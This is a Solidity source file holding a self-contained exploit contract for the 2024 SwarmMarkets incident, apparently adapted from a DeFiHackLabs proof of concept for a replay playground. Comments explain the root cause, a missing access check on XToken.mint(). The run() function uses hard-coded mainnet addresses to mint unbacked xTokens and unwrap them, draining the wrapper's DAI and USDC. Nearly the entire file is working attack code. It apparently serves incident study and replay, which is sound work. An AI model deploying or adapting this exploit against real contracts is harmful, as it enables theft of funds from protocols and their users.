// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-SwarmMarkets).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (testExploit() calls XTOKEN.mint/wrapper.unwrap directly as address(this),
// there is no standalone exploit contract). This contract is a faithful,
// self-contained copy of that inline attack so the playground can deploy it
// and record run(). Logic and addresses are copied verbatim from
// test/SwarmMarkets_exp.sol.
//
// Root cause: XToken.mint()/burnFrom() ship with NO onlyWrapper access
// control (the modifier is defined but never attached to the function). Any
// address can mint itself unbacked xTokens for free, then call the honest,
// permissionless XTokenWrapper.unwrap() to redeem them 1:1 for the real
// underlying (DAI/USDC) the wrapper custodies — draining the wrapper's
// entire float for those two assets.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IXTOKEN {
    function mint(address account, uint256 amount) external;
    function burnFrom(address account, uint256 amount) external;
}

interface IXTOKENWrapper {
    function unwrap(address _xToken, uint256 _amount) external;
}

contract SwarmMarketsDrain {
    IXTOKEN constant XTOKEN = IXTOKEN(0xD08E245Fdb3f1504aea4056e2C71615DA7001440);
    IXTOKEN constant XTOKEN2 = IXTOKEN(0x0a3fbF5B4cF80DB51fCAe21efe63f6a36D45d2B2);
    IXTOKENWrapper constant wrapper = IXTOKENWrapper(0x2b9dc65253c035Eb21778cB3898eab5A0AdA0cCe);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function run() external {
        // Step 0: read the wrapper's live float for both assets.
        uint256 daiFloat = DAI.balanceOf(address(wrapper));
        uint256 usdcFloat = USDC.balanceOf(address(wrapper));

        // Step 1-2: free, unbacked mint — XToken.mint() has NO onlyWrapper check.
        XTOKEN.mint(address(this), daiFloat);
        XTOKEN2.mint(address(this), usdcFloat);

        // Step 3-4: unwrap burns the fake xTokens and pays out the real
        // underlying 1:1 from the wrapper's pooled reserve.
        wrapper.unwrap(address(XTOKEN), daiFloat);
        wrapper.unwrap(address(XTOKEN2), usdcFloat);
    }

    fallback() external payable {}
}
